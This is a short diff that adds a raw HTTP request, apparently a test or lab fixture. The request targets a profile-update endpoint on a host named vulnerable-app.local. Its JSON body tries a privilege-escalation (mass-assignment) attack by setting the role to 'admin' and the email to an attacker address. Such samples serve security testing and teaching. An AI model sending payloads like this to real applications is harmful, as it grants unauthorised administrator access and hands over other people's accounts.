@@ -1,0 +1,10 @@
+POST /api/v1/update_profile HTTP/1.1
+Host: vulnerable-app.local
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1Ni...
+
+{
+  "user_id": 1045,
+  "email": "attacker@evil.com",
+  "role": "admin"
+}
